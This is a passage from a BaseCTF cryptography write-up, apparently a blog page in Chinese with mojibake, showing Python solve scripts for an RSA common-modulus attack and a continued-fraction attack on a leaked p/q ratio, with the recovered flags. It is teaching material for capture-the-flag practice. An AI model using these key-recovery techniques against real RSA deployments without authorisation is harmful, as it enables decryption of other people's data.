style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span></span></span></span></p><p>æœ€åå¾—åˆ°çš„æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mn>2</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">m^{gcd(e1,e2)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">d</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>ï¼Œæœ€åå¼€ä¸ªæ ¹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307</span><br>e1 = <span class="hljs-number">3747</span><br>e2 = <span class="hljs-number">2991</span><br>c1 = <span class="hljs-number">24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083</span><br>c2 = <span class="hljs-number">6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293</span><br>s,s1,s2=gcdext(e1,e2)<br><br>m=(<span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n))%n<br><br><span class="hljs-built_in">print</span>(long_to_bytes(iroot(m,s)[<span class="hljs-number">0</span>]))<br><span class="hljs-comment">#b&#x27;BaseCTF&#123;feb7e1ae-a8f7-4fc4-8d6d-945a45cc3f6d&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="wiener"><a class="markdownIt-Anchor" href="#wiener"></a> wiener?</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> decimal<br>flag=<span class="hljs-string">b&quot;BaseCTF&#123;&#125;&quot;</span><br>m = bytes_to_long(flag)<br><br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n=p*q<br><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><br>decimal.getcontext().prec = <span class="hljs-number">648</span><br>P=decimal.Decimal(p)<br>Q=decimal.Decimal(q)<br>leak=decimal.Decimal((<span class="hljs-number">3</span>*P*Q-<span class="hljs-number">1</span>)/(<span class="hljs-number">3</span>*Q*Q))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak =&quot;</span>,leak)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057</span><br><span class="hljs-string">leak = 0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥æ‘˜æŠ„çš„wieneræ”»å‡»çš„æ€æƒ³ï¼Œè¿åˆ†æ•°å®šç†ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">âˆ£</mo><mi>a</mi><mo>âˆ’</mo><mfrac><mi>c</mi><mi>d</mi></mfrac><mo fence="true">âˆ£</mo></mrow><mo>&lt;</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mo>âˆ—</mo><msup><mi>d</mi><mn>2</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mtext>å¯å¾—</mtext><mfrac><mi>c</mi><mi>d</mi></mfrac><mtext>å°±æ˜¯</mtext><mi>a</mi><mtext>çš„ä¸€ä¸ªè¿åˆ†æ•°è¿‘ä¼¼</mtext></mrow><annotation encoding="application/x-tex">\left|a-\frac{c}{d}\right|&lt;\frac{1}{2*d^2}\\å¯å¾—\frac{c}{d}å°±æ˜¯açš„ä¸€ä¸ªè¿åˆ†æ•°è¿‘ä¼¼</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.859975em;vertical-align:-0.686em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.173975em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.556985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.572975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.173975em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.556985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.572975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">å¾—</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">è¿</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">è¿‘</span><span class="mord cjk_fallback">ä¼¼</span></span></span></span></span></p><p>ï¼ˆè‡³äºå®šç†è¯æ˜æˆ‘ä¹Ÿä¸ä¼šï¼Œä¸å¥½æ„æ€å–µï¼‰</p><p>æ¨å¯¼ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>=</mo><mfrac><mrow><mn>3</mn><mo>âˆ—</mo><mi>P</mi><mo>âˆ—</mo><mi>Q</mi><mo>âˆ’</mo><mn>1</mn></mrow><mrow><mn>3</mn><mo>âˆ—</mo><mi>Q</mi><mo>âˆ—</mo><mi>Q</mi></mrow></mfrac><mspace linebreak="newline"></mspace><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>=</mo><mfrac><mi>P</mi><mi>Q</mi></mfrac><mo>âˆ’</mo><mfrac><mn>1</mn><mrow><mn>3</mn><mo>âˆ—</mo><msup><mi>Q</mi><mn>2</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mrow><mo fence="true">âˆ£</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>âˆ’</mo><mfrac><mi>P</mi><mi>Q</mi></mfrac><mo fence="true">âˆ£</mo></mrow><mo>=</mo><mfrac><mn>1</mn><mrow><mn>3</mn><mo>âˆ—</mo><msup><mi>Q</mi><mn>2</mn></msup></mrow></mfrac><mo>&lt;</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mo>âˆ—</mo><msup><mi>Q</mi><mn>2</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mtext>ä¹‹åè®¡ç®—</mtext><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mtext>çš„è¿åˆ†æ•°ï¼Œå³å¯å¾—åˆ°</mtext><mi>p</mi><mtext>å’Œ</mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">leak=\frac{3*P*Q-1}{3*Q*Q}\\leak=\frac{P}{Q}-\frac{1}{3*Q^2}\\\left|leak-\frac{P}{Q}\right|=\frac{1}{3*Q^2}&lt;\frac{1}{2*Q^2}\\ä¹‹åè®¡ç®—leakçš„è¿åˆ†æ•°ï¼Œå³å¯å¾—åˆ°på’Œq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.24077em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603299999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">Q</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.2407700000000004em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.42999em;vertical-align:-0.9500199999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ä¹‹</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">è®¡</span><span class="mord cjk_fallback">ç®—</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">è¿</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å³</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">åˆ°</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">å’Œ</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057</span><br>leak = <span class="hljs-number">0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>cf = continued_fraction(leak)<br>convers = cf.convergents()<br><span class="hljs-keyword">for</span> pkd <span class="hljs-keyword">in</span> convers:<br>    <span class="hljs-comment"># possible k, d</span><br>    pp, pq = pkd.as_integer_ratio()<br>    pp=<span class="hljs-built_in">int</span>(pp)<br>    <span class="hljs-keyword">if</span> pp.bit_length()==<span class="hljs-number">1024</span> <span class="hljs-keyword">and</span> isPrime(pp):<br>        flag=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,inverse(e,pp-<span class="hljs-number">1</span>),pp)))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Base&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;BaseCTF&#123;9431ee53-5d5c-4b0b-956f-1eafff6c9e87&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="æ²¡æœ‰nå•Š_pro"><a class="markdownIt-Anchor" href="#æ²¡æœ‰nå•Š_pro"></a> æ²¡æœ‰nå•Š_pro</h3><blockquote><p>å‰è¨€ï¼š</p><p>åœ¨ä¹‹å‰è¥¿ç“œæ¯çš„æ¯”èµ›ä¸­æˆ‘å‡ºä¸€æ¬¡è¿™ä¸ªé¢˜ï¼Œç„¶ååœ¨å‰å‡ 